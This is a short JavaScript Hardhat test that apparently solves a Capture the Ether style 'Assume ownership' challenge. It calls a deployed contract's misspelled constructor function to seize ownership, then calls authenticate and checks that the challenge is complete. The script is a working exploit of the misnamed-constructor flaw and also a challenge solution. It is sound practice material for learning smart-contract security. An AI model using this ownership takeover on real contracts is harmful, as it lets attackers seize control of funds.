const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = `0x40eE58968c1C77090EF8B46AB6791Fed3511b6F1`;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const factory = await ethers.getContractFactory("AssumeOwnershipChallenge");
  contract = factory.attach(CHALLENGE_ADDRESS);
});

it("AssumeOwnership", async function () {
  console.log("Calling the misnamed constructor function");
  const tx = await contract.AssumeOwmershipChallenge({ gasLimit: 3e6 });
  await tx.wait();
  console.log("Calling authenticate");
  const tx2 = await contract.authenticate({ gasLimit: 3e6 });
  await tx2.wait();
  var isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
  util.updateTotalPoints(scriptName);
});
